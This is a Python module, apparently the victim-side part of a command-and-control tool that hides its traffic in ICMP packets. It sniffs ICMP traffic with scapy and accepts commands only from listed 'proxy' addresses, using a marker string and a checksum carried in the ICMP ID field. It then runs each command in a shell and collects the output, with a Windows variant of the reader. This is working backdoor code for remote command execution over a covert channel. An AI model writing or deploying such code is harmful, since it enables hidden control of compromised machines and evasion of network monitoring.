from scapy.all import IP, ICMP, Raw 
from classes import CALC, ARGS_CONFIG  
from custom_enum import MSG, ENTITY 
from type.check_type import is_namespace, is_string  
from entita.entita_class import Victim 
from utils_methods import threadEvent_set, threadEvent_wait
import argparse, threading, sys, select, ipaddress  

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 


def get_data_from_command(process_shell):
    count=0
    print(f"Did command failed? {process_shell.poll() is not None}") 
    data=[]
    there_is_smth_to_read=True
    while there_is_smth_to_read: 
        count+=1
        print(f"lettura dei dati... {count}")
        print("UUU")
        reads = [process_shell.stderr.fileno(),process_shell.stdout.fileno()] 
        print("UUU")
        ret = select.select(reads, [], [], 1.0)  # 1s timeout for safety 
        for fd in ret[0]:
            if fd == process_shell.stdout.fileno(): 
                output_line = process_shell.stdout.readline()
                if output_line:
                    stripped_data=output_line.strip()
                    print("stdout:",stripped_data)
                    data.append(stripped_data) 
                    if MSG.END_DATA.strip() in stripped_data:
                        print(f"No more lines to read")
                        there_is_smth_to_read = False
                        break
                else:
                    print(f"stdout EOF {output_line}") 
                    there_is_smth_to_read = False
            if fd == process_shell.stderr.fileno(): 
                error_line = process_shell.stderr.readline()
                if error_line:
                    stripped_data=error_line.strip()
                    data.append(stripped_data)
                    print("stderr:", stripped_data) 
                    there_is_smth_to_read = False  
                    break
                else:
                    print(f"stderr EOF {output_line}") 
                    there_is_smth_to_read = False  
                    break
        # Optional: check if process exited early
        #if process_shell.poll() is not None and there_is_smth_to_read:
            #print("Process exited but streams may still have data")
    print(f"Command finished with exit code {process_shell.poll()}")
    return data 

def _windows_get_data_from_command(process_shell):
    data = []
    while True:
        line = process_shell.stdout.readline()
        if not line:
            break
        data.append(line.strip())
    return data
    #stdout_data, stderr_data = process_shell.communicate()
    #return stdout_data.splitlines(), stderr_data.splitlines() 

def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
    def callback(packet):
        nonlocal comando, connected_proxy, event_pktconn
        print(f"callback wait_for_command received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and MSG.CONFIRM_COMMAND.encode() in packet[Raw].load:
                comando.append(packet[Raw].load.decode().replace(MSG.CONFIRM_COMMAND,""))
                checksum=CALC.checksum((MSG.CONFIRM_COMMAND+comando[0]).encode())
                print(f"Payload: {packet[Raw].load} and ICMP ID: {packet[ICMP].id}") 
                if packet[ICMP].id==checksum: 
                    print(f"Ricevuto il comando {comando}")
                    threadEvent_set(event_pktconn)
                    return 
            if ipaddress.ip_address(packet[IP].src) not in connected_proxy:
                print(f"Received packet from not recognized address {packet[IP].src}")
            if MSG.CONFIRM_COMMAND.encode() not in packet[Raw].load:
                print(f"Payload doesn't have CONFIRM_COMMAND: {packet[Raw].load}")
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and MSG.END_COMMUNICATION.encode() in packet[Raw].load:
                print(f"End of communication ")
                comando.append(packet[Raw].load.decode()) #packet[Raw].load.decode().replace(END_COMMUNICATION,"")
                threadEvent_set(event_pktconn)
                return
    return callback

def check_value_in_parser(args): 
    try:
        if not isinstance(args,argparse.Namespace):
            raise Exception("Argomento parser non è istanza di argparse.Namespace")  
        if not isinstance(args.num_proxy, int):
            raise ValueError("Il numero di proxy non è un intero") 
    except Exception as e: 
        raise Exception(f"check_value_in_parser: {e}") 
    return True 


 
    